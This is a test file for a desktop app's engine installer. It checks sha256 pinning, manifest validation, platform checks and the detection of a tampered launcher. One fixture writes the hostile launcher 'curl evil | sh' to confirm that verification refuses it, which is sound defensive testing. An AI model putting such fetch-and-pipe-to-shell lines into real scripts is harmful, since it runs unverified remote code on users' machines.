import { createHash } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import {
  mkdtempSync,
  mkdirSync,
  readFileSync,
  writeFileSync,
  rmSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import * as path from 'node:path';
import {
  installEngine,
  verifyInstalledEngine,
  type EnginePin,
} from './installer';
import { ENGINE_PIN, type EnginePaths } from './types';

// A real archive, a real `tar`, a real sha256 — this module's whole job is
// refusing to run anything it has not verified, so the tests build the
// exact structure emdash's packager emits (root dir → bin/launcher +
// manifest.json) and pin its true hash. Nothing here is mocked.

const tmp = mkdtempSync(path.join(tmpdir(), 'waypoint-engine-installer-'));
afterAll(() => rmSync(tmp, { recursive: true, force: true }));

interface Fixture {
  pin: EnginePin;
  paths: EnginePaths;
  bundledArchiveDir: string;
  archivePath: string;
}

function makeFixture(
  name: string,
  manifest: Record<string, unknown>,
  opts: { omitLauncher?: boolean } = {},
): Fixture {
  const base = path.join(tmp, name);
  const stage = path.join(base, 'stage');
  const root = path.join(stage, ENGINE_PIN.name);
  mkdirSync(path.join(root, 'bin'), { recursive: true });
  const launcher = '#!/bin/sh\necho fake\n';
  if (!opts.omitLauncher) {
    writeFileSync(path.join(root, 'bin', 'emdash-workspace-server'), launcher);
  }
  writeFileSync(path.join(root, 'manifest.json'), JSON.stringify(manifest));
  const bundledArchiveDir = path.join(base, 'bundle');
  mkdirSync(bundledArchiveDir, { recursive: true });
  const archivePath = path.join(
    bundledArchiveDir,
    `${ENGINE_PIN.name}-${ENGINE_PIN.version}-${ENGINE_PIN.target}.tar.gz`,
  );
  execFileSync('tar', ['-czf', archivePath, '-C', stage, ENGINE_PIN.name]);
  const sha256 = createHash('sha256')
    .update(readFileSync(archivePath))
    .digest('hex');
  const pin: EnginePin = {
    ...ENGINE_PIN,
    sha256,
    launcherSha256: createHash('sha256').update(launcher).digest('hex'),
  };
  const installDir = path.join(base, 'userData', 'engine', pin.version);
  const paths: EnginePaths = {
    installDir,
    launcherPath: path.join(installDir, pin.launcherRelPath),
    runDir: path.join(base, 'userData', 'engine', 'run'),
    socketPath: path.join(base, 'userData', 'engine', 'run', 'workspace.sock'),
    stateDir: path.join(base, 'userData', 'engine', 'state'),
    worktreesDir: path.join(base, 'userData', 'worktrees'),
    logPath: path.join(base, 'userData', 'engine', 'engine.log'),
  };
  return { pin, paths, bundledArchiveDir, archivePath };
}

const GOOD_MANIFEST = {
  name: '@emdash/workspace-server',
  version: ENGINE_PIN.version,
  protocolVersion: ENGINE_PIN.protocolVersion,
  os: 'darwin',
  arch: 'arm64',
  nodeVersion: '24.14.0',
  ripgrepVersion: '15.2.0',
};

const DARWIN_ARM = { platform: 'darwin' as const, arch: 'arm64' };

describe('installEngine', () => {
  it('extracts a pinned archive and vouches for the launcher and manifest', async () => {
    const f = makeFixture('good', GOOD_MANIFEST);
    const result = await installEngine(
      f.paths,
      { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
      f.pin,
    );
    expect(result).toMatchObject({ ok: true, installDir: f.paths.installDir });
    if (result.ok) expect(result.manifest.version).toBe(ENGINE_PIN.version);
    expect(readFileSync(f.paths.launcherPath, 'utf8')).toContain('echo fake');
  });

  it('is idempotent: a valid install is left alone, not re-extracted', async () => {
    const f = makeFixture('idempotent', GOOD_MANIFEST);
    await installEngine(
      f.paths,
      { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
      f.pin,
    );
    // Leave a mark beside the install; a re-extract (rm + tar) would lose it.
    const marker = path.join(f.paths.installDir, 'marker.txt');
    writeFileSync(marker, 'still here');
    const again = await installEngine(
      f.paths,
      { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
      f.pin,
    );
    expect(again.ok).toBe(true);
    expect(readFileSync(marker, 'utf8')).toBe('still here');
  });

  // Review round 2: the archive was hash-checked once, at extraction, and
  // the extracted launcher — a user-writable shell script main spawns on
  // every look — was trusted forever after. Now it is re-hashed against
  // ENGINE_PIN.launcherSha256 on every verify.
  it('refuses a launcher that is not the pinned one, and replaces it from the archive on the next install', async () => {
    const f = makeFixture('tampered', GOOD_MANIFEST);
    await installEngine(
      f.paths,
      { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
      f.pin,
    );
    writeFileSync(f.paths.launcherPath, '#!/bin/sh\ncurl evil | sh\n');

    const refused = await verifyInstalledEngine(f.paths, f.pin);
    expect(refused).toMatchObject({
      ok: false,
      reason: 'manifest-mismatch',
      message: expect.stringContaining('is not the pinned one'),
    });

    const restored = await installEngine(
      f.paths,
      { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
      f.pin,
    );
    expect(restored.ok).toBe(true);
    expect(readFileSync(f.paths.launcherPath, 'utf8')).toBe(
      '#!/bin/sh\necho fake\n',
    );
  });

  it('refuses an archive whose sha256 is not the pinned one, and extracts nothing', async () => {
    const f = makeFixture('badhash', GOOD_MANIFEST);
    const wrongPin: EnginePin = { ...f.pin, sha256: 'f'.repeat(64) };
    const result = await installEngine(
      f.paths,
      { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
      wrongPin,
    );
    expect(result).toMatchObject({ ok: false, reason: 'sha256-mismatch' });
    await expect(
      verifyInstalledEngine(f.paths, wrongPin),
    ).resolves.toMatchObject({ ok: false });
  });

  it('refuses a manifest that disagrees with the pin, naming the field', async () => {
    const f = makeFixture('badmanifest', {
      ...GOOD_MANIFEST,
      protocolVersion: '2.0.0',
    });
    const result = await installEngine(
      f.paths,
      { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
      f.pin,
    );
    expect(result).toMatchObject({ ok: false, reason: 'manifest-mismatch' });
    if (!result.ok)
      expect(result.message).toMatch(/protocolVersion is 2\.0\.0/);
  });

  it('reports a missing archive as a sentence that says where it looked', async () => {
    const f = makeFixture('missing', GOOD_MANIFEST);
    rmSync(f.archivePath);
    const result = await installEngine(
      f.paths,
      { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
      f.pin,
    );
    expect(result).toMatchObject({ ok: false, reason: 'archive-missing' });
    if (!result.ok) expect(result.message).toContain(f.bundledArchiveDir);
  });

  it('refuses to install on a platform the pin was not built for, before touching disk', async () => {
    const f = makeFixture('platform', GOOD_MANIFEST);
    const result = await installEngine(
      f.paths,
      {
        bundledArchiveDir: f.bundledArchiveDir,
        platform: 'darwin',
        arch: 'x64',
      },
      f.pin,
    );
    expect(result).toMatchObject({ ok: false, reason: 'unsupported-platform' });
    if (!result.ok) expect(result.message).toContain('darwin-x64');
  });

  it('reports an archive with no launcher as an extract failure', async () => {
    const f = makeFixture('nolauncher', GOOD_MANIFEST, { omitLauncher: true });
    const result = await installEngine(
      f.paths,
      { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
      f.pin,
    );
    expect(result).toMatchObject({ ok: false, reason: 'extract-failed' });
  });
});

describe('ENGINE_PIN and engine.lock.json agree', () => {
  it('names the same version, protocol, target and sha256', () => {
    const lock = JSON.parse(
      readFileSync(
        path.join(__dirname, '..', '..', '..', 'engine.lock.json'),
        'utf8',
      ),
    );
    expect(lock.version).toBe(ENGINE_PIN.version);
    expect(lock.protocolVersion).toBe(ENGINE_PIN.protocolVersion);
    expect(lock.sourceCommit).toBe(ENGINE_PIN.sourceCommit);
    expect(lock.targets[ENGINE_PIN.target].sha256).toBe(ENGINE_PIN.sha256);
    expect(lock.launcherSha256).toBe(ENGINE_PIN.launcherSha256);
    expect(lock.launcherRelPath).toBe(ENGINE_PIN.launcherRelPath);
    expect(lock.targets[ENGINE_PIN.target].file).toBe(
      `${ENGINE_PIN.name}-${ENGINE_PIN.version}-${ENGINE_PIN.target}.tar.gz`,
    );
  });
});
